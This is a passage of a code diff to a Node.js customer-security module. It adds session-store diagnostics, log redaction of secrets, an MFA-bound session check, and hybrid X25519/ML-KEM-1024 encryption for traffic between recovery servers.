+          customer_digest: customerSecurityShortDigestV219(customerId),
+          session_id_digest: customerSecurityShortDigestV219(conflictRow && conflictRow.id || '')
+        });
+        const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'create_conflict_verify', {
+          ok: false,
+          status: 409,
+          data: {
+            code: 'SESSION_CREATE_CONFLICT_VERIFICATION_FAILED',
+            message: 'Existing session row did not satisfy strict ownership, token, device, active, revoke, and expiry checks.'
+          }
+        }, {
+          elapsed_ms: Date.now() - conflictReadStartedAtMs,
+          reason: 'session_create_conflict_verification_failed',
+          method: 'GET'
+        });
+        return {
+          ok: false,
+          reason: 'session_create_conflict_verification_failed',
+          status: 409,
+          diagnostic_code: diagnostic.diagnostic_code,
+          failure_point: diagnostic.failure_point,
+          upstream_status: diagnostic.upstream_status,
+          provider_code: diagnostic.provider_code,
+          failure_id: diagnostic.failure_id
+        };
+      }
+
+      customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_failed', {
+        decision: 'return_failure',
+        database_operation: 'POST',
+        upstream_status: created.status,
+        customer_digest: customerSecurityShortDigestV219(customerId)
+      });
+      const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'create', created, {
+        elapsed_ms: Date.now() - createStartedAtMs,
+        reason: 'session_create_failed'
+      });
+      return {
+        ok: false,
+        reason: 'session_create_failed',
+        status: created.status,
+        diagnostic_code: diagnostic.diagnostic_code,
+        failure_point: diagnostic.failure_point,
+        upstream_status: diagnostic.upstream_status,
+        provider_code: diagnostic.provider_code,
+        failure_id: diagnostic.failure_id
+      };
+    }
+
+    activeStage = 'telemetry';
     await customerSecurityWriteSessionTelemetry(customerId, fingerprint);
 
+    activeStage = 'create_response';
     const createdRows = Array.isArray(created.data) ? created.data : [];
-    return { ok: true, created: true, session_id: createdRows[0] && createdRows[0].id ? createdRows[0].id : null };
+    const createdRow = createdRows.length === 1 ? createdRows[0] : null;
+    const createdSessionId = createdRow && createdRow.id ? createdRow.id : null;
+    if (!createdSessionId || Number(createdRow.security_epoch || 0) !== resolvedSecurityEpoch) {
+      customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_missing_id', {
+        decision: 'return_failure',
+        database_operation: 'POST',
+        upstream_status: created.status,
+        customer_digest: customerSecurityShortDigestV219(customerId)
+      });
+      const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'create', created, {
+        elapsed_ms: Date.now() - createStartedAtMs,
+        reason: 'session_create_response_missing_id',
+        condition: 'response_missing_id'
+      });
+      return {
+        ok: false,
+        reason: 'session_create_response_missing_id',
+        status: created.status,
+        diagnostic_code: diagnostic.diagnostic_code,
+        failure_point: diagnostic.failure_point,
+        upstream_status: diagnostic.upstream_status,
+        provider_code: diagnostic.provider_code,
+        failure_id: diagnostic.failure_id
+      };
+    }
+
+    customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_succeeded', {
+      decision: 'return_success',
+      database_operation: 'POST',
+      touch_ok: true,
+      customer_digest: customerSecurityShortDigestV219(customerId),
+      session_id_digest: customerSecurityShortDigestV219(createdSessionId)
+    });
+    return { ok: true, created: true, session_id: createdSessionId, security_epoch: resolvedSecurityEpoch };
   } catch (error) {
-    console.error('[customer-security-session]', customerSecuritySafeLogError(error));
-    return { ok: false, reason: 'session_exception' };
+    const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, activeStage + '_exception', {
+      ok: false,
+      status: 0,
+      data: {
+        code: error && (error.code || error.name) || 'SESSION_EXCEPTION',
+        message: error && error.message || 'Session store exception'
+      }
+    }, {
+      reason: 'session_exception',
+      condition: 'exception',
+      method: activeStage === 'create' ? 'POST' : activeStage === 'update' ? 'PATCH' : activeStage === 'read' ? 'GET' : 'LOCAL'
+    });
+    return {
+      ok: false,
+      reason: 'session_exception',
+      diagnostic_code: diagnostic.diagnostic_code,
+      failure_point: diagnostic.failure_point,
+      upstream_status: diagnostic.upstream_status,
+      provider_code: diagnostic.provider_code,
+      failure_id: diagnostic.failure_id
+    };
   }
 }
 
@@ -5112,8 +6617,29 @@ async function customerSecurityWriteSessionTelemetry(customerId, fingerprint) {
   }).catch(() => null);
 }
 
+function diracSecurityRedactDiagnosticV210(value, maximum = 180) {
+  const limit = Math.max(40, Math.min(400, Number(maximum || 180)));
+  let text = '';
+  if (value && typeof value === 'object') {
+    text = String(value.code || value.name || value.message || 'internal_error');
+  } else {
+    text = String(value || 'internal_error');
+  }
+  return text
+    .replace(/-----BEGIN [^-\r\n]{1,80}-----[\s\S]*?-----END [^-\r\n]{1,80}-----/g, '[redacted-key]')
+    .replace(/\bBearer\s+[^\s,;]+/gi, 'Bearer [redacted]')
+    .replace(/\b(authorization|password|passwd|token|secret|cookie|service[_-]?role|api[_-]?key|apikey|pepper|private[_-]?key)\s*[:=]\s*[^\s,;]+/gi, '$1=[redacted]')
+    .replace(/\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\b/g, '[redacted-jwt]')
+    .replace(/\b[A-Z0-9._%+-]{1,64}@[A-Z0-9.-]{1,190}\.[A-Z]{2,24}\b/gi, '[redacted-email]')
+    .replace(/\b(?:[A-Fa-f0-9]{32,}|[A-Za-z0-9+/_-]{48,}={0,2})\b/g, '[redacted-material]')
+    .replace(/[\u0000-\u001f\u007f]+/g, ' ')
+    .replace(/\s+/g, ' ')
+    .trim()
+    .slice(0, limit) || 'internal_error';
+}
+
 function customerSecuritySafeLogError(error) {
-  return String(error && error.message ? error.message : error).slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 
@@ -5132,7 +6658,7 @@ function customerSecuritySafeLogError(error) {
    GET  /api/health?action=customer_security_guard_status
    ============================================================ */
 
-const __diracCustomerSecurityGuardedActionsPreviousHandler = module.exports;
+const __diracCustomerSecurityGuardedActionsPreviousHandler = __diracV202DispatcherSentinel;
 
 const CUSTOMER_SECURITY_GUARDED_ACTIONS = new Set([
   'customer_security_guard_status',
@@ -5164,13 +6690,13 @@ const CUSTOMER_SECURITY_GUARDED_ALIASES = Object.freeze({
 const CUSTOMER_SECURITY_RATE_LIMIT_STORE = globalThis.__DIRAC_CUSTOMER_SECURITY_RATE_LIMIT_STORE__ || new Map();
 globalThis.__DIRAC_CUSTOMER_SECURITY_RATE_LIMIT_STORE__ = CUSTOMER_SECURITY_RATE_LIMIT_STORE;
 
-module.exports = async function customerSecurityGuardedActionsWrapper(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityGuardedActionsWrapper(req, res, nextHandlerV202) {
   diracApplySecurityResponseHeaders(res);
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityGuardedNormalizeAction(rawAction);
 
   if (!CUSTOMER_SECURITY_GUARDED_ACTIONS.has(action)) {
-    return __diracCustomerSecurityGuardedActionsPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -5189,7 +6715,7 @@ module.exports = async function customerSecurityGuardedActionsWrapper(req, res) 
   }
 
   return customerSecurityHandleGuardedAction(action, req, res);
-};
+}, "customerSecurityGuardedActionsWrapper");
 
 function customerSecurityGuardedNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -5332,6 +6858,7 @@ async function customerSecurityRequireAccess(req, res, options = {}) {
   if (options.requireMfa) {
     mfa = verifyCustomerDashboardMfaCookie(req, user);
     if (!mfa || !mfa.ok) {
+      clearSessionCookies(res);
       await customerSecurityWriteGuardEvent(customerId, {
         event_type: 'security_settings_updated',
         status: 'warning',
@@ -5345,6 +6872,17 @@ async function customerSecurityRequireAccess(req, res, options = {}) {
         ok: false,
         code: 'MFA_REQUIRED',
         message: 'Aksi ini membutuhkan verifikasi A2F/MFA ulang dari dashboard resmi.'
+      });
+      return null;
+    }
+
+    const protectedSession = await checkDomainProtectedDatabaseSessionLockSafe(req, user, mfa).catch(() => null);
+    if (!protectedSession || protectedSession.ok !== true) {
+      if (protectedSession && protectedSession.clearCookies) clearSessionCookies(res);
+      res.status(protectedSession && protectedSession.status || 401).json({
+        ok: false,
+        code: protectedSession && protectedSession.code || 'PROTECTED_SESSION_REQUIRED',
+        message: protectedSession && protectedSession.message || 'Sesi perangkat tidak valid. Silakan login ulang.'
       });
       return null;
     }
@@ -5846,7 +7384,7 @@ function customerSecurityGeneratePlainRecoveryCode() {
 function customerSecurityGenerateLostPasskeyRecoveryCode() {
   const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
   let out = '';
-  while (out.length < CUSTOMER_SECURITY_RECOVERY_CODE_LENGTH) {
+  while (out.length < LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157) {
     out += customerSecurityPickRecoveryChar(alphabet);
   }
   return out;
@@ -5881,13 +7419,19 @@ function customerSecurityGetArgon2() {
 
 async function customerSecurityHashRecoveryCode(code, customerId) {
   const argon2 = customerSecurityGetArgon2();
-  return await argon2.hash(customerSecurityRecoveryCodeArgon2Input(code, customerId), {
-    type: argon2.argon2id,
-    memoryCost: 19456,
-    timeCost: 3,
-    parallelism: 1,
-    hashLength: 32
-  });
+  const salt = crypto.randomBytes(64);
+  try {
+    return await argon2.hash(customerSecurityRecoveryCodeArgon2Input(code, customerId), {
+      type: argon2.argon2id,
+      memoryCost: 19456,
+      timeCost: 3,
+      parallelism: 1,
+      hashLength: 32,
+      salt
+    });
+  } finally {
+    salt.fill(0);
+  }
 }
 
 
@@ -5957,6 +7501,7 @@ const LOST_PASSKEY_RECOVERY_ATTEMPT_LIMIT = 5;
 const DIRAC_RECOVERY_WORKER_ACTION = 'dirac_recovery_worker_generate';
 const DIRAC_RECOVERY_WORKER_TASK_GENERATE = 'lost_passkey_generate';
 const DIRAC_RECOVERY_WORKER_TASK_VERIFY = 'lost_passkey_verify';
+const LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157 = 1200;
 
 function customerSecurityNormalizeLostPasskeyRequestId(value) {
   const clean = String(value || '').trim();
@@ -5968,11 +7513,13 @@ function customerSecurityLostPasskeyRequestId() {
 }
 
 function customerSecurityLostPasskeySecret(scope) {
-  try {
-    return diracCentralDeriveSecretV146('lost-passkey-recovery:' + String(scope || 'default'));
-  } catch (_) {
-    return crypto.createHash('sha256').update(String(getCustomerMfaSecret()) + ':lost-passkey-recovery:' + String(scope || 'default')).digest();
+  const secret = diracCentralDeriveSecretV146('lost-passkey-recovery:' + String(scope || 'default'));
+  if (!Buffer.isBuffer(secret) || secret.length < 64) {
+    const error = new Error('LOST_PASSKEY_DERIVED_SECRET_INVALID');
+    error.code = 'LOST_PASSKEY_DERIVED_SECRET_INVALID';
+    throw error;
   }
+  return secret;
 }
 
 function customerSecurityLostPasskeyHashHex(scope, value) {
@@ -6039,10 +7586,9 @@ function customerSecurityRecoveryWorkerAllowedCaller() {
 }
 
 function customerSecurityRecoveryWorkerLocalDeploymentAllowed() {
-  return diracCentralEnvTrueV150('DIRAC_CENTRAL_VERCEL2_ACTIONS_ENABLED')
-    || diracCentralEnvTrueV150('DIRAC_VERCEL2_ACTIONS_ENABLED')
-    || diracCentralEnvValueV150('DIRAC_CENTRAL_DEPLOYMENT_ROLE') === 'vercel2'
-    || diracCentralEnvValueV150('DIRAC_DEPLOYMENT_ROLE') === 'vercel2';
+  // SERVER 1 boundary: this file may only authenticate, seal, send, and receive
+  // recovery messages. Environment drift must never enable local recovery work.
+  return false;
 }
 
 async function customerSecurityBlockLostPasskeyLocalProcessingOnServer1(req, res, action, reason) {
@@ -6074,14 +7620,52 @@ function customerSecurityRecoveryWorkerMainEnvDiagnostics() {
     'DIRAC_LOST_PASSKEY_ARGON2_TIME_COST',
     'DIRAC_LOST_PASSKEY_MAX_RUNNING',
     'DIRAC_LOST_PASSKEY_QUEUE_MAX',
-    'DIRAC_LOST_PASSKEY_PROCESSING_LOCK_TTL_SECONDS'
+    'DIRAC_LOST_PASSKEY_PROCESSING_LOCK_TTL_SECONDS',
+    'DIRAC_RECOVERY_WORKER_X25519_PRIVATE_KEY',
+    'DIRAC_RECOVERY_WORKER_MLKEM1024_PRIVATE_KEY',
+    'DIRAC_LOST_PASSKEY_ARGON2_PARALLELISM',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_MEMORY_KIB',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_PARALLELISM',
+    'DIRAC_LOST_PASSKEY_ROOT_SECRET',
+    'DIRAC_LOST_PASSKEY_ROOT_SECRET_VERSION',
+    'DIRAC_LOST_PASSKEY_DB_PEPPER',
+    'DIRAC_RECOVERY_SERVER1_URL',
+    'DIRAC_RECOVERY_SERVER1_SERVER_ID',
+    'DIRAC_RECOVERY_HPKE_PRIVATE_KEY',
+    'DIRAC_RECOVERY_HPKE_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_PEPPER',
+    'DIRAC_RECOVERY_HPKE_PEPPER_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_ARGON2_MEMORY_KIB',
+    'DIRAC_RECOVERY_HPKE_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY',
+    'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY_PEM',
+    'DIRAC_LOST_PASSKEY_ED25519_PUBLIC_KEY_PEM',
+    'DIRAC_LOST_PASSKEY_ED25519_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_PEM',
+    'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLKEM1024_PUBLIC_KEY_PEM',
+    'DIRAC_RECOVERY_MLKEM1024_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLKEM1024_KEY_ID',
+    'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_PEM',
+    'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLDSA87_PUBLIC_KEY_PEM',
+    'DIRAC_RECOVERY_MLDSA87_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLDSA87_KEY_ID',
+    'DIRAC_RECOVERY_FIPS_RUNTIME_REQUIRED',
+    'DIRAC_LOST_PASSKEY_QUEUE_DISABLED',
+    'DIRAC_LOST_PASSKEY_QUEUE_LOCK_TTL_SECONDS',
+    'DIRAC_LOST_PASSKEY_QUEUE_MAX_WAIT_SECONDS',
+    'DIRAC_LOST_PASSKEY_QUEUE_POLL_MS'
   ];
   const diagnostics = {
     role: 'server1_main_recovery_caller',
     required_env: [
       'DIRAC_RECOVERY_WORKER_URL',
       'DIRAC_RECOVERY_WORKER_SECRET',
-      'DIRAC_RECOVERY_WORKER_CALLER'
+      'DIRAC_RECOVERY_WORKER_CALLER',
+      'DIRAC_RECOVERY_WORKER_X25519_PUBLIC_KEY',
+      'DIRAC_RECOVERY_WORKER_MLKEM1024_PUBLIC_KEY'
     ],
     server2_only_env: server2OnlyEnv,
     allowed_shared_env: [
@@ -6094,7 +7678,9 @@ function customerSecurityRecoveryWorkerMainEnvDiagnostics() {
     env_state: {
       DIRAC_RECOVERY_WORKER_URL: rawUrl ? 'present' : 'missing',
       DIRAC_RECOVERY_WORKER_SECRET: rawSecret ? 'present' : 'missing',
-      DIRAC_RECOVERY_WORKER_CALLER: rawCaller ? 'present' : 'missing'
+      DIRAC_RECOVERY_WORKER_CALLER: rawCaller ? 'present' : 'missing',
+      DIRAC_RECOVERY_WORKER_X25519_PUBLIC_KEY: String(process.env.DIRAC_RECOVERY_WORKER_X25519_PUBLIC_KEY || '').trim() ? 'present' : 'missing',
+      DIRAC_RECOVERY_WORKER_MLKEM1024_PUBLIC_KEY: String(process.env.DIRAC_RECOVERY_WORKER_MLKEM1024_PUBLIC_KEY || '').trim() ? 'present' : 'missing'
     }
   };
   for (const name of server2OnlyEnv) {
@@ -6123,6 +7709,17 @@ function customerSecurityRecoveryWorkerMainEnvDiagnostics() {
   if (!rawCaller) diagnostics.missing_env.push('DIRAC_RECOVERY_WORKER_CALLER');
   else if (!customerSecurityRecoveryWorkerAsciiToken(rawCaller)) diagnostics.invalid_env.push('DIRAC_RECOVERY_WORKER_CALLER must match ASCII /^[A-Za-z0-9_.-]{1,80}$/');
 
+  for (const [name, type] of [
+    ['DIRAC_RECOVERY_WORKER_X25519_PUBLIC_KEY', 'x25519'],
+    ['DIRAC_RECOVERY_WORKER_MLKEM1024_PUBLIC_KEY', 'ml-kem-1024']
+  ]) {
+    if (!String(process.env[name] || '').trim()) diagnostics.missing_env.push(name);
+    else {
+      try { customerSecurityRecoveryWorkerPublicKeyV190(name, type); }
+      catch (_) { diagnostics.invalid_env.push(name + ' must contain a valid ' + type + ' public key'); }
+    }
+  }
+
   diagnostics.ok = diagnostics.missing_env.length === 0
     && diagnostics.invalid_env.length === 0
     && diagnostics.wrong_server_env.length === 0;
@@ -6142,7 +7739,9 @@ function customerSecurityRecoveryWorkerClockSkewMs() {
 }
 
 function customerSecurityRecoveryWorkerSign(caller, timestamp, canonicalBody) {
-  return crypto.createHmac('sha256', customerSecurityRecoveryWorkerSecret())
+  return crypto.createHmac('sha512', customerSecurityRecoveryWorkerSecret())
+    .update('dirac-recovery-worker-transport-hmac-v190')
+    .update('\n')
     .update(String(caller || ''))
     .update('\n')
     .update(String(timestamp || ''))
@@ -6156,10 +7755,9 @@ function customerSecurityRecoveryWorkerHeaderValue(req, name) {
 }
 
 function customerSecurityRecoveryWorkerLocalEnabled() {
-  return customerSecurityRecoveryWorkerLocalDeploymentAllowed()
-    && !customerSecurityRecoveryWorkerUrl()
-    && Boolean(customerSecurityRecoveryWorkerSecret())
-    && Boolean(customerSecurityRecoveryWorkerAllowedCaller());
+  // Fail closed permanently on Server 1. Incoming recovery-worker execution is
+  // forbidden; only the outbound encrypted worker channel is permitted.
+  return false;
 }
 
 function customerSecurityLostPasskeyCanonical(value) {
@@ -6171,15 +7769,292 @@ function customerSecurityLostPasskeyCanonical(value) {
   return JSON.stringify(value);
 }
 
+// Recovery-only application-layer transport. TLS remains mandatory; this
+// envelope prevents plaintext recovery material from appearing on the
+// Server 1 -> Server 2 wire even if an intermediary terminates TLS.
+const DIRAC_RECOVERY_WORKER_TRANSPORT_VERSION_V190 = 'dirac-recovery-worker-hybrid-v191';
+const DIRAC_RECOVERY_WORKER_TRANSPORT_SUITE_V190 = 'X25519+ML-KEM-1024+HKDF-SHA512+AES-256-GCM';
+const DIRAC_RECOVERY_WORKER_RESPONSE_VERSION_V190 = 'dirac-recovery-worker-response-v191';
+const DIRAC_RECOVERY_WORKER_TRANSPORT_TTL_MS_V190 = 120000;
+
+function customerSecurityRecoveryWorkerTransportFailV190(code) {
+  const error = new Error(String(code || 'RECOVERY_WORKER_TRANSPORT_FAILED'));
+  error.code = String(code || 'RECOVERY_WORKER_TRANSPORT_FAILED');
+  return error;
+}
+
+function customerSecurityRecoveryWorkerDecodeB64uV190(value, exactLength, maximumTextLength = 64 * 1024) {
+  const clean = String(value || '').trim();
+  if (!clean || clean.length > maximumTextLength || !/^[A-Za-z0-9_-]+$/.test(clean) || clean.length % 4 === 1) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_BASE64URL_INVALID');
+  }
+  const decoded = Buffer.from(clean, 'base64url');
+  if (decoded.toString('base64url') !== clean || (exactLength !== null && decoded.length !== exactLength)) {
+    decoded.fill(0);
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_BASE64URL_LENGTH_INVALID');
+  }
+  return decoded;
+}
+
+function customerSecurityRecoveryWorkerPublicKeyV190(name, expectedType) {
+  const raw = String(process.env[name] || '').trim();
+  if (!raw) throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_PUBLIC_KEY_MISSING');
+  let key;
+  try {
+    key = raw.includes('-----BEGIN')
+      ? crypto.createPublicKey(raw.replace(/\\n/g, '\n'))
+      : crypto.createPublicKey({ key: Buffer.from(raw, 'base64'), format: 'der', type: 'spki' });
+  } catch (_) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_PUBLIC_KEY_INVALID');
+  }
+  if (!key || key.asymmetricKeyType !== expectedType) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_PUBLIC_KEY_TYPE_INVALID');
+  }
+  return key;
+}
+
+function customerSecurityRecoveryWorkerKeyFingerprintV190(x25519Key, mlkemKey) {
+  const xPublic = x25519Key && x25519Key.type === 'public' ? x25519Key : crypto.createPublicKey(x25519Key);
+  const mlPublic = mlkemKey && mlkemKey.type === 'public' ? mlkemKey : crypto.createPublicKey(mlkemKey);
+  const xDer = xPublic.export({ format: 'der', type: 'spki' });
+  const mlDer = mlPublic.export({ format: 'der', type: 'spki' });
+  const lengthPrefix = Buffer.alloc(8);
+  lengthPrefix.writeUInt32BE(xDer.length, 0);
+  lengthPrefix.writeUInt32BE(mlDer.length, 4);
+  try {
+    return crypto.createHash('sha512').update(lengthPrefix).update(xDer).update(mlDer).digest('base64url');
+  } finally {
+    lengthPrefix.fill(0);
+    xDer.fill(0);
+    mlDer.fill(0);
+  }
+}
+
+function customerSecurityRecoveryWorkerTransportAadV190(envelope) {
+  return {
+    action: String(envelope.action || ''),
+    worker_action: String(envelope.worker_action || ''),
+    caller_id: String(envelope.caller_id || ''),
+    nonce: String(envelope.nonce || ''),
+    transport_version: String(envelope.transport_version || ''),
+    transport_suite: String(envelope.transport_suite || ''),
+    receiver_key_fingerprint: String(envelope.receiver_key_fingerprint || ''),
+    sent_at_ms: Number(envelope.sent_at_ms),
+    expires_at_ms: Number(envelope.expires_at_ms),
+    x25519_ephemeral_public_key_b64url: String(envelope.x25519_ephemeral_public_key_b64url || ''),
+    mlkem_ciphertext_b64url: String(envelope.mlkem_ciphertext_b64url || ''),
+    hkdf_salt_b64url: String(envelope.hkdf_salt_b64url || ''),
+    aead_nonce_b64url: String(envelope.aead_nonce_b64url || '')
+  };
+}
+
+function customerSecurityRecoveryWorkerSealV190(innerPayload, caller, timestampText) {
+  if (typeof crypto.encapsulate !== 'function') {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_MLKEM_RUNTIME_UNAVAILABLE');
+  }
+  const timestamp = Number(timestampText);
+  if (!Number.isSafeInteger(timestamp) || timestamp <= 0) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_TRANSPORT_TIME_INVALID');
+  }
+  const x25519Public = customerSecurityRecoveryWorkerPublicKeyV190('DIRAC_RECOVERY_WORKER_X25519_PUBLIC_KEY', 'x25519');
+  const mlkemPublic = customerSecurityRecoveryWorkerPublicKeyV190('DIRAC_RECOVERY_WORKER_MLKEM1024_PUBLIC_KEY', 'ml-kem-1024');
+  const ephemeral = crypto.generateKeyPairSync('x25519');
+  const ephemeralDer = ephemeral.publicKey.export({ format: 'der', type: 'spki' });
+  const classicShared = crypto.diffieHellman({ privateKey: ephemeral.privateKey, publicKey: x25519Public });
+  const pq = crypto.encapsulate(mlkemPublic);
+  if (!pq || !Buffer.isBuffer(pq.sharedKey) || pq.sharedKey.length !== 32 || !Buffer.isBuffer(pq.ciphertext) || pq.ciphertext.length !== 1568) {
+    classicShared.fill(0);
+    ephemeralDer.fill(0);
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_MLKEM_ENCAPSULATION_INVALID');
+  }
+  const salt = crypto.randomBytes(64);
+  const aeadNonce = crypto.randomBytes(12);
+  const plaintext = Buffer.from(customerSecurityLostPasskeyCanonical(innerPayload), 'utf8');
+  const envelope = {
+    action: DIRAC_RECOVERY_WORKER_ACTION,
+    worker_action: String(innerPayload && innerPayload.worker_action || ''),
+    caller_id: String(caller || ''),
+    nonce: String(innerPayload && innerPayload.nonce || ''),
+    transport_version: DIRAC_RECOVERY_WORKER_TRANSPORT_VERSION_V190,
+    transport_suite: DIRAC_RECOVERY_WORKER_TRANSPORT_SUITE_V190,
+    receiver_key_fingerprint: customerSecurityRecoveryWorkerKeyFingerprintV190(x25519Public, mlkemPublic),
+    sent_at_ms: timestamp,
+    expires_at_ms: timestamp + DIRAC_RECOVERY_WORKER_TRANSPORT_TTL_MS_V190,
+    x25519_ephemeral_public_key_b64url: ephemeralDer.toString('base64url'),
+    mlkem_ciphertext_b64url: pq.ciphertext.toString('base64url'),
+    hkdf_salt_b64url: salt.toString('base64url'),
+    aead_nonce_b64url: aeadNonce.toString('base64url')
+  };
+  const aad = Buffer.from(customerSecurityLostPasskeyCanonical(customerSecurityRecoveryWorkerTransportAadV190(envelope)), 'utf8');
+  const transcriptHash = crypto.createHash('sha512').update(aad).digest();
+  const ikm = Buffer.concat([classicShared, pq.sharedKey]);
+  const requestKey = Buffer.from(crypto.hkdfSync('sha512', ikm, salt, Buffer.concat([
+    Buffer.from('dirac/recovery-worker/v190/request\n', 'utf8'),
+    transcriptHash
+  ]), 32));
+  const responseKey = Buffer.from(crypto.hkdfSync('sha512', ikm, salt, Buffer.concat([
+    Buffer.from('dirac/recovery-worker/v190/response\n', 'utf8'),
+    transcriptHash
+  ]), 32));
+  try {
+    const cipher = crypto.createCipheriv('aes-256-gcm', requestKey, aeadNonce, { authTagLength: 16 });
+    cipher.setAAD(aad, { plaintextLength: plaintext.length });
+    const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()]);
+    const tag = cipher.getAuthTag();
+    envelope.ciphertext_b64url = ciphertext.toString('base64url');
+    envelope.auth_tag_b64url = tag.toString('base64url');
+    ciphertext.fill(0);
+    tag.fill(0);
+    return {
+      envelope,
+      responseKey,
+      requestNonce: envelope.nonce,
+      workerAction: envelope.worker_action,
+      caller: envelope.caller_id
+    };
+  } catch (error) {
+    responseKey.fill(0);
+    throw error;
+  } finally {
+    ephemeralDer.fill(0);
+    classicShared.fill(0);
+    pq.sharedKey.fill(0);
+    pq.ciphertext.fill(0);
+    salt.fill(0);
+    aeadNonce.fill(0);
+    plaintext.fill(0);
+    aad.fill(0);
+    transcriptHash.fill(0);
+    ikm.fill(0);
+    requestKey.fill(0);
+  }
+}
+
+function customerSecurityRecoveryWorkerResponseAadV190(context, status) {
+  return {
+    version: DIRAC_RECOVERY_WORKER_RESPONSE_VERSION_V190,
+    request_nonce: String(context && context.requestNonce || ''),
+    worker_action: String(context && context.workerAction || ''),
+    caller_id: String(context && context.caller || ''),
+    status: Number(status)
+  };
+}
+
+function customerSecurityRecoveryWorkerOpenResponseV190(data, context, status) {
+  const outer = data && typeof data === 'object' && !Array.isArray(data) ? data : {};
+  const expectedOuterKeys = ['ok', 'transport_encrypted', 'transport_response'];
+  const actualOuterKeys = Object.keys(outer).sort();
+  if (actualOuterKeys.length !== expectedOuterKeys.length || actualOuterKeys.some((key, index) => key !== expectedOuterKeys[index])) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_OUTER_FIELDS_INVALID');
+  }
+  const response = outer.transport_response && typeof outer.transport_response === 'object' && !Array.isArray(outer.transport_response)
+    ? outer.transport_response
+    : null;
+  if (outer.ok !== true || outer.transport_encrypted !== true || !response || response.version !== DIRAC_RECOVERY_WORKER_RESPONSE_VERSION_V190) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_ENCRYPTED_RESPONSE_REQUIRED');
+  }
+  const expectedKeys = ['auth_tag_b64url', 'caller_id', 'ciphertext_b64url', 'nonce_b64url', 'request_nonce', 'status', 'version', 'worker_action'];
+  const actualKeys = Object.keys(response).sort();
+  if (actualKeys.length !== expectedKeys.length || actualKeys.some((key, index) => key !== expectedKeys[index])) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_FIELDS_INVALID');
+  }
+  if (response.request_nonce !== context.requestNonce
+    || response.worker_action !== context.workerAction
+    || response.caller_id !== context.caller
+    || Number(response.status) !== Number(status)) {
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_BINDING_INVALID');
+  }
+  const nonce = customerSecurityRecoveryWorkerDecodeB64uV190(response.nonce_b64url, 12, 128);
+  const ciphertext = customerSecurityRecoveryWorkerDecodeB64uV190(response.ciphertext_b64url, null, 128 * 1024);
+  const tag = customerSecurityRecoveryWorkerDecodeB64uV190(response.auth_tag_b64url, 16, 128);
+  const aad = Buffer.from(customerSecurityLostPasskeyCanonical(customerSecurityRecoveryWorkerResponseAadV190(context, status)), 'utf8');
+  let plaintext;
+  try {
+    const decipher = crypto.createDecipheriv('aes-256-gcm', context.responseKey, nonce, { authTagLength: 16 });
+    decipher.setAAD(aad, { plaintextLength: ciphertext.length });
+    decipher.setAuthTag(tag);
+    plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+    const text = new TextDecoder('utf-8', { fatal: true }).decode(plaintext);
+    const parsed = JSON.parse(text);
+    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed) || customerSecurityLostPasskeyCanonical(parsed) !== text) {
+      throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_PLAINTEXT_INVALID');
+    }
+    return parsed;
+  } catch (error) {
+    if (error && error.code) throw error;
+    throw customerSecurityRecoveryWorkerTransportFailV190('RECOVERY_WORKER_RESPONSE_AUTHENTICATION_FAILED');
+  } finally {
+    nonce.fill(0);
+    ciphertext.fill(0);
+    tag.fill(0);
+    aad.fill(0);
+    if (plaintext) plaintext.fill(0);
+  }
+}
+
+// Recovery transport responses are small JSON envelopes. Read them with a
